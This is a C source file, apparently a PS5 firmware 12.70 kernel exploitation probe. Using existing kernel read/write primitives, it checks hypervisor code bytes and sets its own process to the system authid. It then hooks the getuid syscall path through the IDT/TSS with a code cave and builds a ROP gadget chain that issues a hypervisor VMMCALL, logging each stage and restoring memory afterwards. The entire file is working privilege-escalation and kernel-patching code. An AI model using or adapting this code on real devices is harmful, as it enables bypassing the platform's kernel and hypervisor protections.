#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <ps5/kernel.h>
#include <ps5/klog.h>

#include "kdlsym.h"
#include "khook.h"
#include "util.h"

#define FW_1270              0x12700000U
#define SYSTEM_AUTHID        0x4800000000000007ULL
#define SYSENTS_DATA_OFFSET  0x1af4d0ULL
#define SYSENTS_PS4_OFFSET   0x1a6f80ULL
#define SYS_GETUID           24ULL
#define SYSENT_SIZE          48ULL
#define SYSENT_CALL_OFFSET   8ULL
#define PCPU_ARRAY_OFFSET    0x2e9cf00ULL
#define PCPU_STRIDE          0x980ULL
#define HOOK_CORE            0
#define HOOK_IST             6
#define CAVE_STATE_OFF       0x600ULL
#define BIG_SAVE_BYTES       0x600U
#define SECOND_MARKER        0x1270DBDB5EEDBEEFULL
#define RETURN_MARKER        0x1270CA11BACC0FF0ULL
#define VMMCALL_COMMAND      0x17ULL /* bounded HV case: guest RAX <- 0 */
#define VMMCALL_OFF          0xC9DAE9ULL
#define BALANCE_OFF          0xD22AA7ULL
#define SOC_PHAT             0x840F60

#ifdef KERNEL_VMMCALL_SKIP_1270
#define PROBE_MODE           "skip-vmmcall"
#define CALL_TARGET_OFF      (VMMCALL_OFF + 3ULL) /* pop rbp; ret */
#else
#define PROBE_MODE           "vmmcall"
#define CALL_TARGET_OFF      VMMCALL_OFF
#endif

extern unsigned long KERNEL_ADDRESS_DMAP_BASE;
extern int sceKernelGetMainSocId(void);

static uint8_t saved_head[KH_SCRATCH_MIN];
static uint8_t saved_big[BIG_SAVE_BYTES];

static int read_qword(uint64_t addr, uint64_t *value)
{
  *value = 0;
  return kread(addr, value, sizeof(*value));
}

static int match_bytes(uint64_t address, const uint8_t *expected, size_t length)
{
  uint8_t actual[16] = {0};
  return length <= sizeof(actual) && kread(address, actual, length) == 0 &&
         memcmp(actual, expected, length) == 0;
}

int main(void)
{
  uint32_t fw = kernel_get_fw_version();
  int soc = sceKernelGetMainSocId();
  uint64_t dmap = (uint64_t)KERNEL_ADDRESS_DMAP_BASE;
  if ((fw & 0xffff0000U) != FW_1270 || soc != SOC_PHAT ||
      (dmap >> 48) != 0xffffU || (dmap & 0x3fffffffU) != 0 ||
      dmap > UINT64_MAX - 0x6284b434ULL) {
    klog("KVC1270,2,stop,stage=platform,fw=0x%08x,soc=0x%x,dmap=0x%016" PRIx64 "\n",
         fw, soc, dmap);
    return 2;
  }

  static const uint8_t command_slot[] = {0xd1, 0xca, 0xff, 0xff};
  static const uint8_t command_handler[] = {
      0x4c, 0x89, 0xf7, 0x31, 0xf6, 0x31, 0xd2, 0xe8,
      0xcb, 0xa1, 0xff, 0xff};
  static const uint8_t register_helper[] = {
      0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x47, 0x08,
      0x48, 0x85, 0xc0};
  if (!match_bytes(dmap + 0x6284b434ULL, command_slot,
                   sizeof(command_slot)) ||
      !match_bytes(dmap + 0x62847eb9ULL, command_handler,
                   sizeof(command_handler)) ||
      !match_bytes(dmap + 0x62842090ULL, register_helper,
                   sizeof(register_helper))) {
    klog("KVC1270,2,stop,stage=hv-command-guard\n");
    return 2;
  }

  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t state = 0, marker_before = 0, return_before = 0;
  uint8_t vmmcall_bytes[5] = {0}, balance_bytes[3] = {0};
  static const uint8_t expected_vmmcall[5] = {0x0f, 0x01, 0xd9, 0x5d, 0xc3};
  static const uint8_t expected_balance[3] = {0x55, 0x57, 0xc3};
  uint64_t entry = (uint64_t)KERNEL_ADDRESS_DATA_BASE +
                   SYSENTS_DATA_OFFSET + SYS_GETUID * SYSENT_SIZE +
                   SYSENT_CALL_OFFSET;
  uint64_t ps4_entry = (uint64_t)KERNEL_ADDRESS_DATA_BASE +
                       SYSENTS_PS4_OFFSET + SYS_GETUID * SYSENT_SIZE +
                       SYSENT_CALL_OFFSET;
  uint64_t target = 0, ps4_target = 0;
  if (read_qword(cave + CAVE_STATE_OFF, &state) != 0 || state != 0 ||
      read_qword(cave + KH_OFF_USER, &marker_before) != 0 ||
      marker_before != 0 ||
      read_qword(cave + KH_OFF_USER + 8, &return_before) != 0 ||
      return_before != 0 ||
      kread(ktext(VMMCALL_OFF), vmmcall_bytes, sizeof(vmmcall_bytes)) != 0 ||
      memcmp(vmmcall_bytes, expected_vmmcall, sizeof(vmmcall_bytes)) != 0 ||
      kread(ktext(BALANCE_OFF), balance_bytes, sizeof(balance_bytes)) != 0 ||
      memcmp(balance_bytes, expected_balance, sizeof(balance_bytes)) != 0 ||
      read_qword(entry, &target) != 0 ||
      read_qword(ps4_entry, &ps4_target) != 0 || ps4_target != target ||
      target < ktext(0) || target >= ktext(KH_KIMG_MAX)) {
    klog("KVC1270,2,stop,stage=preflight,state=0x%016" PRIx64
         ",marker=0x%016" PRIx64 ",return=0x%016" PRIx64 ",target=0x%016" PRIx64
         ",ps4_target=0x%016" PRIx64 "\n",
         state, marker_before, return_before, target, ps4_target);
    return 3;
  }

  uint64_t authid = kernel_get_ucred_authid(getpid());
  if (kernel_set_ucred_authid(getpid(), SYSTEM_AUTHID) != 0 ||
      pin_to_core(HOOK_CORE) != 0) {
    klog("KVC1270,2,stop,stage=authid-or-affinity\n");
    kernel_set_ucred_authid(getpid(), authid);
    return 4;
  }

  intptr_t thread = kernel_get_proc_thread(getpid(), -1);
  uint64_t row_thread = 0;
  uint64_t pcpu_row = (uint64_t)KERNEL_ADDRESS_DATA_BASE +
                      PCPU_ARRAY_OFFSET + HOOK_CORE * PCPU_STRIDE;
  if (!thread || read_qword(pcpu_row, &row_thread) != 0 ||
      row_thread != (uint64_t)thread) {
    klog("KVC1270,2,stop,stage=thread-row,thread=0x%016" PRIx64
         ",row=0x%016" PRIx64 "\n", (uint64_t)thread, row_thread);
    kernel_set_ucred_authid(getpid(), authid);
    return 5;
  }

  if (kread(cave, saved_head, sizeof(saved_head)) != 0 ||
      kread(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big)) != 0) {
    klog("KVC1270,2,stop,stage=backup\n");
    kernel_set_ucred_authid(getpid(), authid);
    return 6;
  }

  khook_t hook;
  int result = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (result != 0) {
    klog("KVC1270,2,stop,stage=kh-init,result=%d\n", result);
    kernel_set_ucred_authid(getpid(), authid);
    return 7;
  }
  hook.tss_stride = KH_TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  kh_set_hook_target(&hook, target);
  hook.oneshot = 1;

  int uid_before = getuid();
  klog("KVC1270,2,start,mode=%s,fw=0x%08x,target=0x%016" PRIx64
       ",target_offset=0x%016" PRIx64 ",uid_before=%d\n",
       PROBE_MODE, fw, target, target - ktext(0), uid_before);
  uint8_t handler_buf[10 * sizeof(uint64_t)] = {0};
  kh_chain_t handler;
  kh_chain_init(&handler, handler_buf, sizeof(handler_buf));
  kh_chain_g(&handler, KERNEL_GADGET_POP_RAX);
  kh_chain_q(&handler, VMMCALL_COMMAND);
  kh_chain_g(&handler, KERNEL_GADGET_POP_RDI);
  kh_chain_q(&handler, ktext(CALL_TARGET_OFF));
  kh_chain_q(&handler, ktext(BALANCE_OFF));
  kh_chain_g(&handler, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&handler, cave + KH_OFF_USER + 8);
  kh_chain_g(&handler, KERNEL_GADGET_POP_RAX);
  kh_chain_q(&handler, RETURN_MARKER);
  kh_chain_g(&handler, KERNEL_GADGET_ST_RCX_RAX);
  if (handler.err) {
    klog("KVC1270,2,stop,stage=handler-build\n");
    kernel_set_ucred_authid(getpid(), authid);
    return 8;
  }
  klog("KVC1270,2,before-install,handler_len=%zu\n", handler.len);
  // Give klogsrv time to capture each stage before a possible hard shutdown.
  sleep(1);
  result = kh_install(&hook, &handler);
  if (result != 0) {
    klog("KVC1270,2,stop,stage=kh-install,result=%d\n", result);
    kernel_set_ucred_authid(getpid(), authid);
    return 8;
  }

  uint64_t marker_chain[15] = {0};
  int chain_read = kread(cave + KH_OFF_BIG_CHAIN, marker_chain,
                         sizeof(marker_chain));
  int chain_match = chain_read == 0 &&
                    marker_chain[0] == kgadget(KERNEL_GADGET_POP_RCX) &&
                    marker_chain[1] == cave + KH_OFF_USER &&
                    marker_chain[2] == kgadget(KERNEL_GADGET_POP_RAX) &&
                    marker_chain[3] == SECOND_MARKER &&
                    marker_chain[4] == kgadget(KERNEL_GADGET_ST_RCX_RAX) &&
                    memcmp(&marker_chain[5], handler_buf, sizeof(handler_buf)) == 0;
  klog("KVC1270,2,installed,chain_read=%d,chain_match=%d\n",
       chain_read, chain_match);
  sleep(1);
  if (!chain_match)
    result = 9;

#ifndef KERNEL_VMMCALL_PREP_ONLY_1270
  uint64_t marker_after = 0, return_after = 0;
  int marker_read = -1, return_read = -1;
  int uid_after = -1;
  int disarm = 0;
  if (result == 0) {
    klog("KVC1270,2,before-trigger\n");
    sleep(1);
    result = kh_trigger(&hook);
    if (result == 0) {
      klog("KVC1270,2,after-trigger\n");
      klog("KVC1270,2,before-getuid\n");
      sleep(1);
      uid_after = getuid();
      marker_read = read_qword(cave + KH_OFF_USER, &marker_after);
      return_read = read_qword(cave + KH_OFF_USER + 8, &return_after);
      klog("KVC1270,2,after-getuid,uid=%d,marker_read=%d,"
           "marker=0x%016" PRIx64 ",return_read=%d,return=0x%016" PRIx64 "\n",
           uid_after, marker_read, marker_after, return_read, return_after);
    }
    if (result != 0 || marker_read != 0 || marker_after != SECOND_MARKER ||
        return_read != 0 || return_after != RETURN_MARKER) {
      disarm = kh_disarm(&hook);
      klog("KVC1270,2,disarm,result=%d\n", disarm);
      if (disarm != 0) {
        klog("KVC1270,2,stop,stage=disarm-failed,hook-left-installed\n");
        kernel_set_ucred_authid(getpid(), authid);
        return 12;
      }
    }
  }
#endif

  int hook_restore = kh_restore(&hook);
  klog("KVC1270,2,restore,hook=%d\n", hook_restore);
  if (hook_restore != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    return 10;
  }
  int head_restore = kwrite(cave, saved_head, sizeof(saved_head));
  int big_restore = kwrite(cave + KH_OFF_BIG_CHAIN, saved_big,
                           sizeof(saved_big));
  int auth_restore = kernel_set_ucred_authid(getpid(), authid);
#ifdef KERNEL_VMMCALL_PREP_ONLY_1270
  int ok = result == 0 && head_restore == 0 && big_restore == 0 &&
           auth_restore == 0;
  klog("KVC1270,2,end,%s,prepare_only=1,head=%d,big=%d,auth=%d\n",
       ok ? "ok" : "fail", head_restore, big_restore, auth_restore);
#else
  int ok = result == 0 && uid_after == uid_before && marker_read == 0 &&
           marker_after == SECOND_MARKER && return_read == 0 &&
           return_after == RETURN_MARKER && disarm == 0 &&
           head_restore == 0 && big_restore == 0 && auth_restore == 0;
  klog("KVC1270,2,end,%s,trigger=1,head=%d,big=%d,auth=%d\n",
       ok ? "ok" : "fail", head_restore, big_restore, auth_restore);
#endif
  return ok ? 0 : 11;
}
